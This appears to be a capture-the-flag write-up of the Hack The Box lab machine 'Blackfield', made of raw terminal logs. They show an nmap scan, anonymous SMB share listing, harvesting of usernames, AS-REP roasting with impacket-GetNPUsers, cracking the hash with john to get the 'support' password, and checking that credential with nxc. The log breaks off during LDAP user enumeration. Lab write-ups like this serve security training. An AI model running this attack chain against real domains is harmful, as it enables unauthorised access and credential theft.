https://app.hackthebox.com/machines/Blackfield

```
nmap -sCV -v -p- -T4 10.129.229.17 -oA nmap/blackfield
...
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-16 18:37:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-16T18:37:38
|_  start_date: N/A
|_clock-skew: 6h59m59s

```


```
smbclient -L //10.129.229.17 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
...
┌──(lanc3㉿kali)-[~]
└─$ smbclient //10.129.229.17/forensic -N 
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
...
┌──(lanc3㉿kali)-[~]
└─$ smbclient //10.129.229.17/profiles$ -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jun  4 00:47:12 2020
  ..                                  D        0  Thu Jun  4 00:47:12 2020
  AAlleni                             D        0  Thu Jun  4 00:47:11 2020
  ABarteski                           D        0  Thu Jun  4 00:47:11 2020
  ABekesz                             D        0  Thu Jun  4 00:47:11 2020
  ABenzies                            D        0  Thu Jun  4 00:47:11 2020
  ABiemiller                          D        0  Thu Jun  4 00:47:11 2020
  AChampken                           D        0  Thu Jun  4 00:47:11 2020
  ACheretei                           D        0  Thu Jun  4 00:47:11 2020
  ACsonaki                            D        0  Thu Jun  4 00:47:11 2020
  AHigchens                           D        0  Thu Jun  4 00:47:11 2020
  AJaquemai                           D        0  Thu Jun  4 00:47:11 2020
  AKlado                              D        0  Thu Jun  4 00:47:11 2020
  AKoffenburger                       D        0  Thu Jun  4 00:47:11 2020
  AKollolli                           D        0  Thu Jun  4 00:47:11 2020
  AKruppe                             D        0  Thu Jun  4 00:47:11 2020
  AKubale                             D        0  Thu Jun  4 00:47:11 2020
  ALamerz                             D        0  Thu Jun  4 00:47:11 2020
  AMaceldon                           D        0  Thu Jun  4 00:47:11 2020
  AMasalunga                          D        0  Thu Jun  4 00:47:11 2020
  ANavay                              D        0  Thu Jun  4 00:47:11 2020
  ANesterova                          D        0  Thu Jun  4 00:47:11 2020
  ANeusse                             D        0  Thu Jun  4 00:47:11 2020
  AOkleshen                           D        0  Thu Jun  4 00:47:11 2020
  APustulka                           D        0  Thu Jun  4 00:47:11 2020
  ARotella                            D        0  Thu Jun  4 00:47:11 2020
  ASanwardeker                        D        0  Thu Jun  4 00:47:11 2020
  AShadaia                            D        0  Thu Jun  4 00:47:11 2020
  ASischo                             D        0  Thu Jun  4 00:47:11 2020
  ASpruce                             D        0  Thu Jun  4 00:47:11 2020
  ATakach                             D        0  Thu Jun  4 00:47:11 2020
  ATaueg                              D        0  Thu Jun  4 00:47:11 2020
  ATwardowski                         D        0  Thu Jun  4 00:47:11 2020
  audit2020                           D        0  Thu Jun  4 00:47:11 2020
  AWangenheim                         D        0  Thu Jun  4 00:47:11 2020
  AWorsey                             D        0  Thu Jun  4 00:47:11 2020
  AZigmunt                            D        0  Thu Jun  4 00:47:11 2020
  BBakajza                            D        0  Thu Jun  4 00:47:11 2020
  BBeloucif                           D        0  Thu Jun  4 00:47:11 2020
  BCarmitcheal                        D        0  Thu Jun  4 00:47:11 2020
  BConsultant                         D        0  Thu Jun  4 00:47:11 2020
  BErdossy                            D        0  Thu Jun  4 00:47:11 2020
  BGeminski                           D        0  Thu Jun  4 00:47:11 2020
  BLostal                             D        0  Thu Jun  4 00:47:11 2020
  BMannise                            D        0  Thu Jun  4 00:47:11 2020
  BNovrotsky                          D        0  Thu Jun  4 00:47:11 2020
  BRigiero                            D        0  Thu Jun  4 00:47:11 2020
  BSamkoses                           D        0  Thu Jun  4 00:47:11 2020
  BZandonella                         D        0  Thu Jun  4 00:47:11 2020
  CAcherman                           D        0  Thu Jun  4 00:47:12 2020
  CAkbari                             D        0  Thu Jun  4 00:47:12 2020
  CAldhowaihi                         D        0  Thu Jun  4 00:47:12 2020
  CArgyropolous                       D        0  Thu Jun  4 00:47:12 2020
  CDufrasne                           D        0  Thu Jun  4 00:47:12 2020
  CGronk                              D        0  Thu Jun  4 00:47:11 2020
  Chiucarello                         D        0  Thu Jun  4 00:47:11 2020
  Chiuccariello                       D        0  Thu Jun  4 00:47:12 2020
  CHoytal                             D        0  Thu Jun  4 00:47:12 2020
  CKijauskas                          D        0  Thu Jun  4 00:47:12 2020
  CKolbo                              D        0  Thu Jun  4 00:47:12 2020
  CMakutenas                          D        0  Thu Jun  4 00:47:12 2020
  CMorcillo                           D        0  Thu Jun  4 00:47:11 2020
  CSchandall                          D        0  Thu Jun  4 00:47:12 2020
  CSelters                            D        0  Thu Jun  4 00:47:12 2020
  CTolmie                             D        0  Thu Jun  4 00:47:12 2020
  DCecere                             D        0  Thu Jun  4 00:47:12 2020
  DChintalapalli                      D        0  Thu Jun  4 00:47:12 2020
  DCwilich                            D        0  Thu Jun  4 00:47:12 2020
  DGarbatiuc                          D        0  Thu Jun  4 00:47:12 2020
  DKemesies                           D        0  Thu Jun  4 00:47:12 2020
  DMatuka                             D        0  Thu Jun  4 00:47:12 2020
  DMedeme                             D        0  Thu Jun  4 00:47:12 2020
  DMeherek                            D        0  Thu Jun  4 00:47:12 2020
  DMetych                             D        0  Thu Jun  4 00:47:12 2020
  DPaskalev                           D        0  Thu Jun  4 00:47:12 2020
  DPriporov                           D        0  Thu Jun  4 00:47:12 2020
  DRusanovskaya                       D        0  Thu Jun  4 00:47:12 2020
  DVellela                            D        0  Thu Jun  4 00:47:12 2020
  DVogleson                           D        0  Thu Jun  4 00:47:12 2020
  DZwinak                             D        0  Thu Jun  4 00:47:12 2020
  EBoley                              D        0  Thu Jun  4 00:47:12 2020
  EEulau                              D        0  Thu Jun  4 00:47:12 2020
  EFeatherling                        D        0  Thu Jun  4 00:47:12 2020
  EFrixione                           D        0  Thu Jun  4 00:47:12 2020
  EJenorik                            D        0  Thu Jun  4 00:47:12 2020
  EKmilanovic                         D        0  Thu Jun  4 00:47:12 2020
  ElKatkowsky                         D        0  Thu Jun  4 00:47:12 2020
  EmaCaratenuto                       D        0  Thu Jun  4 00:47:12 2020
  EPalislamovic                       D        0  Thu Jun  4 00:47:12 2020
  EPryar                              D        0  Thu Jun  4 00:47:12 2020
  ESachhitello                        D        0  Thu Jun  4 00:47:12 2020
  ESariotti                           D        0  Thu Jun  4 00:47:12 2020
  ETurgano                            D        0  Thu Jun  4 00:47:12 2020
  EWojtila                            D        0  Thu Jun  4 00:47:12 2020
  FAlirezai                           D        0  Thu Jun  4 00:47:12 2020
  FBaldwind                           D        0  Thu Jun  4 00:47:12 2020
  FBroj                               D        0  Thu Jun  4 00:47:12 2020
  FDeblaquire                         D        0  Thu Jun  4 00:47:12 2020
  FDegeorgio                          D        0  Thu Jun  4 00:47:12 2020
  FianLaginja                         D        0  Thu Jun  4 00:47:12 2020
  FLasokowski                         D        0  Thu Jun  4 00:47:12 2020
  FPflum                              D        0  Thu Jun  4 00:47:12 2020
  FReffey                             D        0  Thu Jun  4 00:47:12 2020
  GaBelithe                           D        0  Thu Jun  4 00:47:12 2020
  Gareld                              D        0  Thu Jun  4 00:47:12 2020
  GBatowski                           D        0  Thu Jun  4 00:47:12 2020
  GForshalger                         D        0  Thu Jun  4 00:47:12 2020
  GGomane                             D        0  Thu Jun  4 00:47:12 2020
  GHisek                              D        0  Thu Jun  4 00:47:12 2020
  GMaroufkhani                        D        0  Thu Jun  4 00:47:12 2020
  GMerewether                         D        0  Thu Jun  4 00:47:12 2020
  GQuinniey                           D        0  Thu Jun  4 00:47:12 2020
  GRoswurm                            D        0  Thu Jun  4 00:47:12 2020
  GWiegard                            D        0  Thu Jun  4 00:47:12 2020
  HBlaziewske                         D        0  Thu Jun  4 00:47:12 2020
  HColantino                          D        0  Thu Jun  4 00:47:12 2020
  HConforto                           D        0  Thu Jun  4 00:47:12 2020
  HCunnally                           D        0  Thu Jun  4 00:47:12 2020
  HGougen                             D        0  Thu Jun  4 00:47:12 2020
  HKostova                            D        0  Thu Jun  4 00:47:12 2020
  IChristijr                          D        0  Thu Jun  4 00:47:12 2020
  IKoledo                             D        0  Thu Jun  4 00:47:12 2020
  IKotecky                            D        0  Thu Jun  4 00:47:12 2020
  ISantosi                            D        0  Thu Jun  4 00:47:12 2020
  JAngvall                            D        0  Thu Jun  4 00:47:12 2020
  JBehmoiras                          D        0  Thu Jun  4 00:47:12 2020
  JDanten                             D        0  Thu Jun  4 00:47:12 2020
  JDjouka                             D        0  Thu Jun  4 00:47:12 2020
  JKondziola                          D        0  Thu Jun  4 00:47:12 2020
  JLeytushsenior                      D        0  Thu Jun  4 00:47:12 2020
  JLuthner                            D        0  Thu Jun  4 00:47:12 2020
  JMoorehendrickson                   D        0  Thu Jun  4 00:47:12 2020
  JPistachio                          D        0  Thu Jun  4 00:47:12 2020
  JScima                              D        0  Thu Jun  4 00:47:12 2020
  JSebaali                            D        0  Thu Jun  4 00:47:12 2020
  JShoenherr                          D        0  Thu Jun  4 00:47:12 2020
  JShuselvt                           D        0  Thu Jun  4 00:47:12 2020
  KAmavisca                           D        0  Thu Jun  4 00:47:12 2020
  KAtolikian                          D        0  Thu Jun  4 00:47:12 2020
  KBrokinn                            D        0  Thu Jun  4 00:47:12 2020
  KCockeril                           D        0  Thu Jun  4 00:47:12 2020
  KColtart                            D        0  Thu Jun  4 00:47:12 2020
  KCyster                             D        0  Thu Jun  4 00:47:12 2020
  KDorney                             D        0  Thu Jun  4 00:47:12 2020
  KKoesno                             D        0  Thu Jun  4 00:47:12 2020
  KLangfur                            D        0  Thu Jun  4 00:47:12 2020
  KMahalik                            D        0  Thu Jun  4 00:47:12 2020
  KMasloch                            D        0  Thu Jun  4 00:47:12 2020
  KMibach                             D        0  Thu Jun  4 00:47:12 2020
  KParvankova                         D        0  Thu Jun  4 00:47:12 2020
  KPregnolato                         D        0  Thu Jun  4 00:47:12 2020
  KRasmor                             D        0  Thu Jun  4 00:47:12 2020
  KShievitz                           D        0  Thu Jun  4 00:47:12 2020
  KSojdelius                          D        0  Thu Jun  4 00:47:12 2020
  KTambourgi                          D        0  Thu Jun  4 00:47:12 2020
  KVlahopoulos                        D        0  Thu Jun  4 00:47:12 2020
  KZyballa                            D        0  Thu Jun  4 00:47:12 2020
  LBajewsky                           D        0  Thu Jun  4 00:47:12 2020
  LBaligand                           D        0  Thu Jun  4 00:47:12 2020
  LBarhamand                          D        0  Thu Jun  4 00:47:12 2020
  LBirer                              D        0  Thu Jun  4 00:47:12 2020
  LBobelis                            D        0  Thu Jun  4 00:47:12 2020
  LChippel                            D        0  Thu Jun  4 00:47:12 2020
  LChoffin                            D        0  Thu Jun  4 00:47:12 2020
  LCominelli                          D        0  Thu Jun  4 00:47:12 2020
  LDruge                              D        0  Thu Jun  4 00:47:12 2020
  LEzepek                             D        0  Thu Jun  4 00:47:12 2020
  LHyungkim                           D        0  Thu Jun  4 00:47:12 2020
  LKarabag                            D        0  Thu Jun  4 00:47:12 2020
  LKirousis                           D        0  Thu Jun  4 00:47:12 2020
  LKnade                              D        0  Thu Jun  4 00:47:12 2020
  LKrioua                             D        0  Thu Jun  4 00:47:12 2020
  LLefebvre                           D        0  Thu Jun  4 00:47:12 2020
  LLoeradeavilez                      D        0  Thu Jun  4 00:47:12 2020
  LMichoud                            D        0  Thu Jun  4 00:47:12 2020
  LTindall                            D        0  Thu Jun  4 00:47:12 2020
  LYturbe                             D        0  Thu Jun  4 00:47:12 2020
  MArcynski                           D        0  Thu Jun  4 00:47:12 2020
  MAthilakshmi                        D        0  Thu Jun  4 00:47:12 2020
  MAttravanam                         D        0  Thu Jun  4 00:47:12 2020
  MBrambini                           D        0  Thu Jun  4 00:47:12 2020
  MHatziantoniou                      D        0  Thu Jun  4 00:47:12 2020
  MHoerauf                            D        0  Thu Jun  4 00:47:12 2020
  MKermarrec                          D        0  Thu Jun  4 00:47:12 2020
  MKillberg                           D        0  Thu Jun  4 00:47:12 2020
  MLapesh                             D        0  Thu Jun  4 00:47:12 2020
  MMakhsous                           D        0  Thu Jun  4 00:47:12 2020
  MMerezio                            D        0  Thu Jun  4 00:47:12 2020
  MNaciri                             D        0  Thu Jun  4 00:47:12 2020
  MShanmugarajah                      D        0  Thu Jun  4 00:47:12 2020
  MSichkar                            D        0  Thu Jun  4 00:47:12 2020
  MTemko                              D        0  Thu Jun  4 00:47:12 2020
  MTipirneni                          D        0  Thu Jun  4 00:47:12 2020
  MTonuri                             D        0  Thu Jun  4 00:47:12 2020
  MVanarsdel                          D        0  Thu Jun  4 00:47:12 2020
  NBellibas                           D        0  Thu Jun  4 00:47:12 2020
  NDikoka                             D        0  Thu Jun  4 00:47:12 2020
  NGenevro                            D        0  Thu Jun  4 00:47:12 2020
  NGoddanti                           D        0  Thu Jun  4 00:47:12 2020
  NMrdirk                             D        0  Thu Jun  4 00:47:12 2020
  NPulido                             D        0  Thu Jun  4 00:47:12 2020
  NRonges                             D        0  Thu Jun  4 00:47:12 2020
  NSchepkie                           D        0  Thu Jun  4 00:47:12 2020
  NVanpraet                           D        0  Thu Jun  4 00:47:12 2020
  OBelghazi                           D        0  Thu Jun  4 00:47:12 2020
  OBushey                             D        0  Thu Jun  4 00:47:12 2020
  OHardybala                          D        0  Thu Jun  4 00:47:12 2020
  OLunas                              D        0  Thu Jun  4 00:47:12 2020
  ORbabka                             D        0  Thu Jun  4 00:47:12 2020
  PBourrat                            D        0  Thu Jun  4 00:47:12 2020
  PBozzelle                           D        0  Thu Jun  4 00:47:12 2020
  PBranti                             D        0  Thu Jun  4 00:47:12 2020
  PCapperella                         D        0  Thu Jun  4 00:47:12 2020
  PCurtz                              D        0  Thu Jun  4 00:47:12 2020
  PDoreste                            D        0  Thu Jun  4 00:47:12 2020
  PGegnas                             D        0  Thu Jun  4 00:47:12 2020
  PMasulla                            D        0  Thu Jun  4 00:47:12 2020
  PMendlinger                         D        0  Thu Jun  4 00:47:12 2020
  PParakat                            D        0  Thu Jun  4 00:47:12 2020
  PProvencer                          D        0  Thu Jun  4 00:47:12 2020
  PTesik                              D        0  Thu Jun  4 00:47:12 2020
  PVinkovich                          D        0  Thu Jun  4 00:47:12 2020
  PVirding                            D        0  Thu Jun  4 00:47:12 2020
  PWeinkaus                           D        0  Thu Jun  4 00:47:12 2020
  RBaliukonis                         D        0  Thu Jun  4 00:47:12 2020
  RBochare                            D        0  Thu Jun  4 00:47:12 2020
  RKrnjaic                            D        0  Thu Jun  4 00:47:12 2020
  RNemnich                            D        0  Thu Jun  4 00:47:12 2020
  RPoretsky                           D        0  Thu Jun  4 00:47:12 2020
  RStuehringer                        D        0  Thu Jun  4 00:47:12 2020
  RSzewczuga                          D        0  Thu Jun  4 00:47:12 2020
  RVallandas                          D        0  Thu Jun  4 00:47:12 2020
  RWeatherl                           D        0  Thu Jun  4 00:47:12 2020
  RWissor                             D        0  Thu Jun  4 00:47:12 2020
  SAbdulagatov                        D        0  Thu Jun  4 00:47:12 2020
  SAjowi                              D        0  Thu Jun  4 00:47:12 2020
  SAlguwaihes                         D        0  Thu Jun  4 00:47:12 2020
  SBonaparte                          D        0  Thu Jun  4 00:47:12 2020
  SBouzane                            D        0  Thu Jun  4 00:47:12 2020
  SChatin                             D        0  Thu Jun  4 00:47:12 2020
  SDellabitta                         D        0  Thu Jun  4 00:47:12 2020
  SDhodapkar                          D        0  Thu Jun  4 00:47:12 2020
  SEulert                             D        0  Thu Jun  4 00:47:12 2020
  SFadrigalan                         D        0  Thu Jun  4 00:47:12 2020
  SGolds                              D        0  Thu Jun  4 00:47:12 2020
  SGrifasi                            D        0  Thu Jun  4 00:47:12 2020
  SGtlinas                            D        0  Thu Jun  4 00:47:12 2020
  SHauht                              D        0  Thu Jun  4 00:47:12 2020
  SHederian                           D        0  Thu Jun  4 00:47:12 2020
  SHelregel                           D        0  Thu Jun  4 00:47:12 2020
  SKrulig                             D        0  Thu Jun  4 00:47:12 2020
  SLewrie                             D        0  Thu Jun  4 00:47:12 2020
  SMaskil                             D        0  Thu Jun  4 00:47:12 2020
  Smocker                             D        0  Thu Jun  4 00:47:12 2020
  SMoyta                              D        0  Thu Jun  4 00:47:12 2020
  SRaustiala                          D        0  Thu Jun  4 00:47:12 2020
  SReppond                            D        0  Thu Jun  4 00:47:12 2020
  SSicliano                           D        0  Thu Jun  4 00:47:12 2020
  SSilex                              D        0  Thu Jun  4 00:47:12 2020
  SSolsbak                            D        0  Thu Jun  4 00:47:12 2020
  STousignaut                         D        0  Thu Jun  4 00:47:12 2020
  support                             D        0  Thu Jun  4 00:47:12 2020
  svc_backup                          D        0  Thu Jun  4 00:47:12 2020
  SWhyte                              D        0  Thu Jun  4 00:47:12 2020
  SWynigear                           D        0  Thu Jun  4 00:47:12 2020
  TAwaysheh                           D        0  Thu Jun  4 00:47:12 2020
  TBadenbach                          D        0  Thu Jun  4 00:47:12 2020
  TCaffo                              D        0  Thu Jun  4 00:47:12 2020
  TCassalom                           D        0  Thu Jun  4 00:47:12 2020
  TEiselt                             D        0  Thu Jun  4 00:47:12 2020
  TFerencdo                           D        0  Thu Jun  4 00:47:12 2020
  TGaleazza                           D        0  Thu Jun  4 00:47:12 2020
  TKauten                             D        0  Thu Jun  4 00:47:12 2020
  TKnupke                             D        0  Thu Jun  4 00:47:12 2020
  TLintlop                            D        0  Thu Jun  4 00:47:12 2020
  TMusselli                           D        0  Thu Jun  4 00:47:12 2020
  TOust                               D        0  Thu Jun  4 00:47:12 2020
  TSlupka                             D        0  Thu Jun  4 00:47:12 2020
  TStausland                          D        0  Thu Jun  4 00:47:12 2020
  TZumpella                           D        0  Thu Jun  4 00:47:12 2020
  UCrofskey                           D        0  Thu Jun  4 00:47:12 2020
  UMarylebone                         D        0  Thu Jun  4 00:47:12 2020
  UPyrke                              D        0  Thu Jun  4 00:47:12 2020
  VBublavy                            D        0  Thu Jun  4 00:47:12 2020
  VButziger                           D        0  Thu Jun  4 00:47:12 2020
  VFuscca                             D        0  Thu Jun  4 00:47:12 2020
  VLitschauer                         D        0  Thu Jun  4 00:47:12 2020
  VMamchuk                            D        0  Thu Jun  4 00:47:12 2020
  VMarija                             D        0  Thu Jun  4 00:47:12 2020
  VOlaosun                            D        0  Thu Jun  4 00:47:12 2020
  VPapalouca                          D        0  Thu Jun  4 00:47:12 2020
  WSaldat                             D        0  Thu Jun  4 00:47:12 2020
  WVerzhbytska                        D        0  Thu Jun  4 00:47:12 2020
  WZelazny                            D        0  Thu Jun  4 00:47:12 2020
  XBemelen                            D        0  Thu Jun  4 00:47:12 2020
  XDadant                             D        0  Thu Jun  4 00:47:12 2020
  XDebes                              D        0  Thu Jun  4 00:47:12 2020
  XKonegni                            D        0  Thu Jun  4 00:47:12 2020
  XRykiel                             D        0  Thu Jun  4 00:47:12 2020
  YBleasdale                          D        0  Thu Jun  4 00:47:12 2020
  YHuftalin                           D        0  Thu Jun  4 00:47:12 2020
  YKivlen                             D        0  Thu Jun  4 00:47:12 2020
  YKozlicki                           D        0  Thu Jun  4 00:47:12 2020
  YNyirenda                           D        0  Thu Jun  4 00:47:12 2020
  YPredestin                          D        0  Thu Jun  4 00:47:12 2020
  YSeturino                           D        0  Thu Jun  4 00:47:12 2020
  YSkoropada                          D        0  Thu Jun  4 00:47:12 2020
  YVonebers                           D        0  Thu Jun  4 00:47:12 2020
  YZarpentine                         D        0  Thu Jun  4 00:47:12 2020
  ZAlatti                             D        0  Thu Jun  4 00:47:12 2020
  ZKrenselewski                       D        0  Thu Jun  4 00:47:12 2020
  ZMalaab                             D        0  Thu Jun  4 00:47:12 2020
  ZMiick                              D        0  Thu Jun  4 00:47:12 2020
  ZScozzari                           D        0  Thu Jun  4 00:47:12 2020
  ZTimofeeff                          D        0  Thu Jun  4 00:47:12 2020
  ZWausik                             D        0  Thu Jun  4 00:47:12 2020

                5102079 blocks of size 4096. 1691881 blocks available
smb: \> 

```

```
mbclient //10.129.229.17/profiles$ -N -c 'ls' | awk '/D/ {print $1}' | grep -vE '^\.+$'
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
ACheretei
ACsonaki
AHigchens
AJaquemai
AKlado
AKoffenburger
AKollolli
AKruppe
AKubale
ALamerz
AMaceldon
AMasalunga
ANavay
ANesterova
ANeusse
AOkleshen
APustulka
ARotella
ASanwardeker
AShadaia
ASischo
ASpruce
ATakach
ATaueg
ATwardowski
audit2020
AWangenheim
AWorsey
AZigmunt
BBakajza
BBeloucif
BCarmitcheal
BConsultant
BErdossy
BGeminski
BLostal
BMannise
BNovrotsky
BRigiero
BSamkoses
BZandonella
CAcherman
CAkbari
CAldhowaihi
CArgyropolous
CDufrasne
CGronk
Chiucarello
Chiuccariello
CHoytal
CKijauskas
CKolbo
CMakutenas
CMorcillo
CSchandall
CSelters
CTolmie
DCecere
DChintalapalli
DCwilich
DGarbatiuc
DKemesies
DMatuka
DMedeme
DMeherek
DMetych
DPaskalev
DPriporov
DRusanovskaya
DVellela
DVogleson
DZwinak
EBoley
EEulau
EFeatherling
EFrixione
EJenorik
EKmilanovic
ElKatkowsky
EmaCaratenuto
EPalislamovic
EPryar
ESachhitello
ESariotti
ETurgano
EWojtila
FAlirezai
FBaldwind
FBroj
FDeblaquire
FDegeorgio
FianLaginja
FLasokowski
FPflum
FReffey
GaBelithe
Gareld
GBatowski
GForshalger
GGomane
GHisek
GMaroufkhani
GMerewether
GQuinniey
GRoswurm
GWiegard
HBlaziewske
HColantino
HConforto
HCunnally
HGougen
HKostova
IChristijr
IKoledo
IKotecky
ISantosi
JAngvall
JBehmoiras
JDanten
JDjouka
JKondziola
JLeytushsenior
JLuthner
JMoorehendrickson
JPistachio
JScima
JSebaali
JShoenherr
JShuselvt
KAmavisca
KAtolikian
KBrokinn
KCockeril
KColtart
KCyster
KDorney
KKoesno
KLangfur
KMahalik
KMasloch
KMibach
KParvankova
KPregnolato
KRasmor
KShievitz
KSojdelius
KTambourgi
KVlahopoulos
KZyballa
LBajewsky
LBaligand
LBarhamand
LBirer
LBobelis
LChippel
LChoffin
LCominelli
LDruge
LEzepek
LHyungkim
LKarabag
LKirousis
LKnade
LKrioua
LLefebvre
LLoeradeavilez
LMichoud
LTindall
LYturbe
MArcynski
MAthilakshmi
MAttravanam
MBrambini
MHatziantoniou
MHoerauf
MKermarrec
MKillberg
MLapesh
MMakhsous
MMerezio
MNaciri
MShanmugarajah
MSichkar
MTemko
MTipirneni
MTonuri
MVanarsdel
NBellibas
NDikoka
NGenevro
NGoddanti
NMrdirk
NPulido
NRonges
NSchepkie
NVanpraet
OBelghazi
OBushey
OHardybala
OLunas
ORbabka
PBourrat
PBozzelle
PBranti
PCapperella
PCurtz
PDoreste
PGegnas
PMasulla
PMendlinger
PParakat
PProvencer
PTesik
PVinkovich
PVirding
PWeinkaus
RBaliukonis
RBochare
RKrnjaic
RNemnich
RPoretsky
RStuehringer
RSzewczuga
RVallandas
RWeatherl
RWissor
SAbdulagatov
SAjowi
SAlguwaihes
SBonaparte
SBouzane
SChatin
SDellabitta
SDhodapkar
SEulert
SFadrigalan
SGolds
SGrifasi
SGtlinas
SHauht
SHederian
SHelregel
SKrulig
SLewrie
SMaskil
Smocker
SMoyta
SRaustiala
SReppond
SSicliano
SSilex
SSolsbak
STousignaut
support
svc_backup
SWhyte
SWynigear
TAwaysheh
TBadenbach
TCaffo
TCassalom
TEiselt
TFerencdo
TGaleazza
TKauten
TKnupke
TLintlop
TMusselli
TOust
TSlupka
TStausland
TZumpella
UCrofskey
UMarylebone
UPyrke
VBublavy
VButziger
VFuscca
VLitschauer
VMamchuk
VMarija
VOlaosun
VPapalouca
WSaldat
WVerzhbytska
WZelazny
XBemelen
XDadant
XDebes
XKonegni
XRykiel
YBleasdale
YHuftalin
YKivlen
YKozlicki
YNyirenda
YPredestin
YSeturino
YSkoropada
YVonebers
YZarpentine
ZAlatti
ZKrenselewski
ZMalaab
ZMiick
ZScozzari
ZTimofeeff
ZWausik

```

nano blackfield-userslist.txt

impacket-GetNPUsers BLACKFIELD.local/ -dc-ip 10.129.229.17 -usersfile blackfield-userslist.txt -outputfile BLACKFIELD-hashes.txt

```
impacket-GetNPUsers BLACKFIELD.local/ -dc-ip 10.129.229.17 -usersfile blackfield-userslist.txt -outputfile BLACKFIELD-hashes.txt
Impacket v0.13.0.dev0+20251002.85540.fc92f471 - Copyright Fortra, LLC and its affiliated companies 

...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$support@BLACKFIELD.LOCAL:13f4dea2d6b213cf3d353e20a793199d$9205ea216ad99a7ad3a5b501b6aa272a128012b6d8dee7fb6e3770ea5aa8429a7f255cf02eccb7909cb6df5ce780d0de5f1c7ecf22958ee683876b37f8f4de90ceebf446747c99039815e600f9d965e90a6690e7200797cea85e0362c94a0cef09d410a098fc95ea80f8ca1b14c2e5acd406396f9118fa9435b31842b66b480fc8de63a82c95d1566afc08ef1f661d97ff042e42fe88f14477a03b64a1ff25850f158fb8a733705470fd70948675906a259c49534e63dde30f05cc15a0c50c4f28e37b0c6f48757559aac517e41a70f1e6525abd353941d7a40d702ae62c819846179de9c1457891354c2169c488a6630972de92
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
...

```

```
nano blackfield-support-hash.txt

┌──(lanc3㉿kali)-[~]
└─$ cat blackfield-support-hash.txt 
$krb5asrep$23$support@BLACKFIELD.LOCAL:13f4dea2d6b213cf3d353e20a793199d$9205ea216ad99a7ad3a5b501b6aa272a128012b6d8dee7fb6e3770ea5aa8429a7f255cf02eccb7909cb6df5ce780d0de5f1c7ecf22958ee683876b37f8f4de90ceebf446747c99039815e600f9d965e90a6690e7200797cea85e0362c94a0cef09d410a098fc95ea80f8ca1b14c2e5acd406396f9118fa9435b31842b66b480fc8de63a82c95d1566afc08ef1f661d97ff042e42fe88f14477a03b64a1ff25850f158fb8a733705470fd70948675906a259c49534e63dde30f05cc15a0c50c4f28e37b0c6f48757559aac517e41a70f1e6525abd353941d7a40d702ae62c819846179de9c1457891354c2169c488a6630972de92

```

john --wordlist=/usr/share/wordlists/rockyou.txt blackfield-support-hash.txt

```
 john --wordlist=/usr/share/wordlists/rockyou.txt blackfield-support-hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:12 DONE (2026-04-17 08:38) 0.07942g/s 1139Kp/s 1139Kc/s 1139KC/s 010015882..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

password for the user `support` is: **`#00^BlackKnight`**



```
nxc smb 10.129.229.17 -u 'support' -p '#00^BlackKnight'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
                                                                                                                                                    
┌──(lanc3㉿kali)-[~]
└─$ nxc winrm 10.129.229.17 -u 'support' -p '#00^BlackKnight'
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.17   5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight
                                                                                                                                                    
┌──(lanc3㉿kali)-[~]
└─$ nxc ldap 10.129.229.17 -u 'support' -p '#00^BlackKnight'
LDAP        10.129.229.17   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
LDAP        10.129.229.17   389    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
                                                                                                                                                    
┌──(lanc3㉿kali)-[~]
└─$ nxc ldap 10.129.229.17 -u 'support' -p '#00^BlackKnight' --users
LDAP        10.129.229.17   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
LDAP        10.129.229.17   389    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
